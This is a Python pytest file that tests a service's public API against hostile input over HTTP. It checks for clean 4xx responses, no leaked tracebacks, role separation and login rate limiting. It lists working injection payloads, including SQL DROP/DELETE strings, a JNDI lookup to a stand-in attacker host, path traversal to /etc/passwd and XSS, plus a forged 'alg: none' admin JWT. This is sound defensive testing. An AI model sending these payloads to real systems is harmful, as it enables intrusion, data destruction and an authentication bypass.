"""Hostile input against the running service.

The endpoints exercised here are reachable without a login — matching, routing, the
conversation, the WhatsApp webhook, application tracking. They are what an attacker can
actually touch, so they are what gets malformed, oversized and injection-shaped input.

The bar is not "it rejects the attack". SQLAlchemy binds parameters and Pydantic
validates shapes, so most of this was already handled. The bar is that **the failure is a
clean 4xx and never a 500, a traceback, or a leaked internal** — an unhandled exception on
a public endpoint is an information disclosure whether or not the payload achieved
anything.

**Driven over real HTTP against the running API**, the same way `scripts/chaos.sh` is.
The in-process route was tried first and abandoned: `TestClient` starts a fresh event loop
per request while the app's SQLAlchemy async engine is a module-level singleton whose pool
binds to the first loop it sees, so every request after the first failed with "attached to
a different loop" — 500s the real service does not produce. Going over the wire avoids
that and exercises more: real Redis, real rate limiting, the real middleware stack.

Skips cleanly when the API is not up, so the suite still passes on a laptop with nothing
running.
"""

from __future__ import annotations

import httpx
import pytest

BASE = "http://localhost:8000"
TIMEOUT = 10.0


def _api_is_up() -> bool:
    try:
        return httpx.get(f"{BASE}/health", timeout=2.0).status_code == 200
    except Exception:  # noqa: BLE001 - any failure means "not running"
        return False


pytestmark = pytest.mark.skipif(
    not _api_is_up(), reason="the API is not running; start it with docker compose up"
)

# Shapes that break a naive string-concatenated query, a naive template, or a naive path
# join. The NUL is built rather than pasted: a raw byte in a source file survives one
# editor and not the next.
INJECTION_STRINGS = [
    "'; DROP TABLE citizens; --",
    "' OR '1'='1",
    "1; DELETE FROM applications WHERE 1=1",
    "admin'--",
    '" OR ""="',
    "'; SELECT pg_sleep(10); --",
    "{{7*7}}",
    "${jndi:ldap://evil.invalid/a}",
    "../../../../etc/passwd",
    "..\\..\\windows\\system32",
    "<script>alert(1)</script>",
    chr(0) + "nullbyte",
    "%00",
]


def _post(path: str, payload: object) -> httpx.Response:
    return httpx.post(f"{BASE}{path}", json=payload, timeout=TIMEOUT)


def _get(path: str, **kwargs) -> httpx.Response:
    return httpx.get(f"{BASE}{path}", timeout=TIMEOUT, **kwargs)


def _clean(response: httpx.Response) -> bool:
    """A refusal, not a crash. A 5xx on hostile input is the failure this file hunts."""
    return response.status_code < 500


# --- injection-shaped input ------------------------------------------------------------


# A raw NUL is not transmittable in a URL — httpx refuses to send it, so the server never
# sees it. Percent-encoded, it *is* transmittable, and that case is covered below.
URL_SAFE_INJECTIONS = [p for p in INJECTION_STRINGS if chr(0) not in p]


@pytest.mark.parametrize("payload", URL_SAFE_INJECTIONS)
def test_injection_in_a_reference_number_never_500s(payload: str) -> None:
    """The tracking endpoint takes a path parameter straight off the URL."""
    url = httpx.URL(f"{BASE}/api/v1/applications/").join(httpx.URL(path=payload))
    assert _clean(httpx.get(url, timeout=TIMEOUT))


def test_a_percent_encoded_null_in_the_path_is_refused_cleanly() -> None:
    """This was a 500 until the null-byte guard was added.

    A NUL is legal in a URL once percent-encoded and legal in JSON as an escape, but
    Postgres `text` and `jsonb` cannot store one — so it passed Pydantic, passed the
    rule engine, and died inside asyncpg as an unhandled error on a public endpoint.
    """
    response = _get("/api/v1/applications/%00")
    assert response.status_code == 400
    assert "invalid character" in response.json()["detail"]


def test_a_null_byte_in_a_json_body_is_refused_cleanly() -> None:
    """The same bug through the other door. Also a 500 before the guard."""
    response = _post("/api/v1/match", {"profile": {"occupation_type": chr(0) + "x"}})
    assert response.status_code == 400


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_in_a_profile_value_never_500s(payload: str) -> None:
    """Profile values reach the rule engine's expression evaluator."""
    response = _post("/api/v1/match", {"profile": {"occupation_type": payload}, "language": "en"})
    assert _clean(response), response.text[:200]


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_in_a_scheme_code_never_500s(payload: str) -> None:
    response = _post("/api/v1/partners/route", {"scheme_code": payload, "amount": 50000})
    assert _clean(response), response.text[:200]


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_injection_through_the_public_webhook_never_500s(payload: str) -> None:
    """Unauthenticated, and it reaches the conversation orchestrator."""
    response = _post(
        "/api/v1/webhook/whatsapp",
        {"simulate": True, "sender": "919876500000", "text": payload, "language": "en"},
    )
    assert _clean(response), response.text[:200]


def test_the_database_still_has_its_tables_afterwards() -> None:
    """The obvious check nobody writes: did any of that actually drop anything?"""
    response = _get("/api/v1/documents/checklist", params={"family": "MICRO_FINANCE"})
    assert response.status_code == 200
    assert response.json()["documents"], "the checklist is empty; something was destroyed"


def test_an_unknown_profile_field_is_refused_not_absorbed() -> None:
    """The engine validates its own contract; an invented field is a 4xx, not a write."""
    response = _post(
        "/api/v1/match", {"profile": {"is_admin": True, "verdict": "ELIGIBLE"}, "language": "en"}
    )
    assert response.status_code == 422


# --- malformed and oversized ------------------------------------------------------------


def test_a_body_that_is_not_json_is_not_a_crash() -> None:
    response = httpx.post(
        f"{BASE}/api/v1/match",
        content=b"{not json at all",
        headers={"Content-Type": "application/json"},
        timeout=TIMEOUT,
    )
    assert _clean(response)


@pytest.mark.parametrize("body", [[1, 2, 3], None, "a string", 42, True])
def test_a_body_of_the_wrong_shape_is_refused(body: object) -> None:
    assert _clean(_post("/api/v1/match", body))


def test_wrong_types_everywhere() -> None:
    response = _post(
        "/api/v1/partners/route",
        {"scheme_code": 12345, "amount": "not a number", "lat": {"a": 1}, "lng": []},
    )
    assert response.status_code == 422


def test_an_out_of_range_coordinate_is_refused() -> None:
    """Latitude 999 is not a place. It must not reach PostGIS."""
    response = _post(
        "/api/v1/partners/route",
        {"scheme_code": "NSFDC_MICRO_FINANCE", "amount": 50000, "lat": 999, "lng": 999},
    )
    assert response.status_code == 422


def test_a_negative_amount_is_refused() -> None:
    response = _post(
        "/api/v1/partners/route", {"scheme_code": "NSFDC_MICRO_FINANCE", "amount": -1}
    )
    assert response.status_code == 422


def test_a_very_long_utterance_is_refused_not_processed() -> None:
    """A 2000-character cap exists so one request cannot cost an unbounded model call."""
    response = _post("/api/v1/conversation/turn", {"utterance": "a" * 50_000, "language": "en"})
    assert response.status_code == 422


def test_a_deeply_nested_payload_does_not_exhaust_the_parser() -> None:
    nested: object = "x"
    for _ in range(200):
        nested = {"a": nested}
    assert _clean(_post("/api/v1/match", {"profile": {"notes": nested}}))


def test_unicode_and_control_characters_are_survivable() -> None:
    """Six scripts in, so the parser meets more than ASCII. It must not meet a 500."""
    samples = [
        "".join(chr(c) for c in (1, 2, 31)),
        "आ" * 500,
        "\U0001d573\U0001d58a",
        "﻿BOM",
        "\U0001f642" * 100,
    ]
    for text in samples:
        response = _post(
            "/api/v1/webhook/whatsapp",
            {"simulate": True, "sender": "919876500000", "text": text, "language": "hi"},
        )
        assert _clean(response), repr(text[:20])


# --- what an error is allowed to say ------------------------------------------------------


def test_an_error_never_returns_a_traceback() -> None:
    """A traceback names internal paths, table names and library versions."""
    responses = [
        _get("/api/v1/applications/does-not-exist"),
        _post("/api/v1/match", {"profile": {"bad_field": 1}}),
        _post("/api/v1/partners/route", {"scheme_code": "NOPE", "amount": 1}),
    ]
    for response in responses:
        body = response.text.lower()
        for leak in ("traceback", 'file "/app', "sqlalchemy.", "psycopg", "asyncpg."):
            assert leak not in body, f"{leak!r} leaked in a {response.status_code}"


def test_every_response_carries_a_request_id() -> None:
    """So a citizen quoting a reference off an error screen gives support one grep."""
    response = _get("/api/v1/applications/does-not-exist")
    assert response.headers.get("X-Request-ID")
    assert response.json().get("request_id")


def test_an_unknown_reference_does_not_confirm_whether_one_exists() -> None:
    """Identical wording either way, or the 404 is a reference-number oracle."""
    a = _get("/api/v1/applications/SETU-9999-ZZ-999999")
    b = _get("/api/v1/applications/TOTALLY-MADE-UP")
    assert a.status_code == b.status_code == 404
    assert a.json()["detail"] == b.json()["detail"]


# --- authorisation ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("method", "path"),
    [
        ("GET", "/api/v1/partner/queue"),
        ("GET", "/api/v1/partner/capacity"),
        ("PATCH", "/api/v1/partner/capacity"),
        ("GET", "/api/v1/admin/analytics"),
        ("GET", "/api/v1/admin/export.csv"),
        ("GET", "/api/v1/auth/me"),
    ],
)
def test_every_console_endpoint_refuses_an_anonymous_caller(method: str, path: str) -> None:
    response = httpx.request(
        method, f"{BASE}{path}", json={} if method == "PATCH" else None, timeout=TIMEOUT
    )
    assert response.status_code == 401, f"{method} {path} was reachable without a token"


@pytest.mark.parametrize(
    "token",
    [
        "not-a-token",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBzZXR1Lmdvdi5pbiIsInJvbGUiOiJBRE1JTiJ9.",
        "a.b.c",
    ],
)
def test_a_forged_or_unsigned_token_is_refused(token: str) -> None:
    """The second entry is `alg: none` carrying an admin role — the classic JWT bypass."""
    response = _get("/api/v1/admin/analytics", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 401


def test_a_partner_token_cannot_reach_the_ministry_dashboard() -> None:
    """Role separation, over the wire rather than in a unit test."""
    login = _post(
        "/api/v1/auth/login", {"email": "partner@setu.gov.in", "password": "setu-demo-2026"}
    )
    if login.status_code != 200:
        pytest.skip("demo users are not seeded")
    token = login.json()["access_token"]
    response = _get("/api/v1/admin/analytics", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 403


def test_the_login_endpoint_does_not_reveal_which_half_was_wrong() -> None:
    """Distinguishing them tells an attacker which addresses are registered."""
    unknown = _post("/api/v1/auth/login", {"email": "nobody@example.invalid", "password": "x"})
    known = _post("/api/v1/auth/login", {"email": "admin@setu.gov.in", "password": "wrong"})
    assert unknown.status_code == known.status_code == 401
    assert unknown.json()["detail"] == known.json()["detail"]


# --- rate limiting, for real ------------------------------------------------------------------


def test_login_is_actually_rate_limited() -> None:
    """Banding is unit-tested; this proves the Redis round trip works end to end.

    Login is the hardest-metered endpoint because it is the only one worth brute-forcing.
    Deliberately exhausts a window, so it is written to be the last word on that bucket.
    """
    seen: set[int] = set()
    for _ in range(30):
        response = _post(
            "/api/v1/auth/login", {"email": "brute@example.invalid", "password": "guess"}
        )
        seen.add(response.status_code)
        if response.status_code == 429:
            assert response.headers.get("Retry-After"), "a 429 must say when to come back"
            assert response.json()["request_id"], "even a 429 is traceable"
            return
    pytest.fail(f"login was never rate limited in 30 attempts; saw {sorted(seen)}")
